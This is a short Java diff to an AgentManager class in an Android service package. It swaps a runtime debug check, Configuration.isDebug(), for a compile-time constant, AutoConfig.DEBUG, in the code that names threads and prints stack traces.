@@ -14,6 +14,7 @@ import android.util.Log;
 
 import com.android.service.Manager;
 import com.android.service.Status;
+import com.android.service.auto.AutoConfig;
 import com.android.service.conf.Configuration;
 import com.android.service.interfaces.AbstractFactory;
 import com.android.service.util.Check;
@@ -143,7 +144,7 @@ public class AgentManager extends Manager<AgentBase, AgentType, AgentType> {
 		a.parse(agents.get(key));
 
 		final Thread t = new Thread(a);
-		if (Configuration.isDebug()) {
+		if (AutoConfig.DEBUG) {
 			t.setName(a.getClass().getSimpleName());
 		}
 		threads.put(a, t);
@@ -187,7 +188,7 @@ public class AgentManager extends Manager<AgentBase, AgentType, AgentType> {
 				t.join();
 			} catch (final InterruptedException e) {
 				// TODO Auto-generated catch block
-				if(Configuration.isDebug()) { e.printStackTrace(); }
+				if(AutoConfig.DEBUG) { e.printStackTrace(); }
 			}
 		}
 		threads.remove(a);
